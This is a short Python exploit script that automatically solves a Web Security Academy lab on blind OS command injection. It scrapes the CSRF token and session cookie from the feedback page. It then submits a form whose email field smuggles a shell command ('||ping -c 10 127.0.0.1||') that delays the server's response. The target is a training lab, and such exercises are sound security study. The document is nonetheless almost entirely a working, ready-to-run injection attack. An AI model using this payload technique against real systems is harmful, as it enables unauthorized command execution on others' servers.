import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind OS command injection with time delays')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# Extraction of session and CSRF tokens needed for submitting malicious feedback.
r = requests.get('https://' + lab.id + '.web-security-academy.net/feedback')
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)

# Data to send within the payload
headers = { 'Cookie': f'session={r.cookies.get("session")}' }

data = {
    'csrf': f'{csrf}',
    'name': 'Command Injection',
    'email': 'asd@asd.com||ping -c 10 127.0.0.1||',
    'subject': 'Command Injection',
    'message': 'Command Injection'
}

try:
    r = requests.post('https://' + lab.id + '.web-security-academy.net/feedback/submit', headers=headers, data=data)
    print(r.text)
    r = requests.get('https://' + lab.id + '.web-security-academy.net/')
    assert('<p>Solved</p>' in r.text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.") 
